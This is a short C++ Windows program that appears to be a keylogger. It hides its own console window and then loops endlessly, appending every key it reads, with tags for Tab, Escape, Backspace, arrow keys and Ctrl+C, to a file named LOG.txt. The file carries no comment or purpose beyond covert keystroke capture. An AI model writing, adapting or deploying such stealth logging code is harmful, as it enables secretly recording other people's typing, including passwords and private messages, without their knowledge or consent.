#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <conio.h>
#include <Windows.h>

using namespace std;


#define Arrow_UP 72
#define Arrow_DOWN 80
#define Arrow_LEFT 75
#define Arrow_Right 77

void goInvis()
{
	HWND console;
	AllocConsole();
	console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(console, 0);
}

FILE *Log;

BOOL CtrlHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
	case CTRL_C_EVENT:
		fprintf(Log, "[Ctrl+C]");
		return(TRUE);
		break;
	default:
		return FALSE;
	}
}

void main()
{
	Sleep(20);
	goInvis();
	Log = fopen("LOG.txt", "a+");
	char key;
	while (":)")
	{
		if (GetKeyState(VK_CONTROL))
		{
			if (SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE))
			{
			}
		}
		if (_kbhit())
		{
			key = _getch();
			switch ((int)key)
			{
			case VK_TAB:
				fprintf(Log, "[TAB]");
				break;
			case VK_RETURN:
				fprintf(Log, "\n");
				break;
			case VK_ESCAPE:
				fprintf(Log, "[ESC]");
				break;
			case VK_BACK:
				fprintf(Log, "[BACKSPACE]");
				break;
			case Arrow_UP:
				fprintf(Log, "[ArrowUP]");
				break;
			case Arrow_DOWN:
				fprintf(Log, "[ArrowDown]");
				break;
			case Arrow_LEFT:
				fprintf(Log, "[ArrowLeft]");
				break;
			case Arrow_Right:
				fprintf(Log, "[ArrowRight]");
				break;
			default:
				fputc(key, Log);
			}
		}
	}
	fclose(Log);
}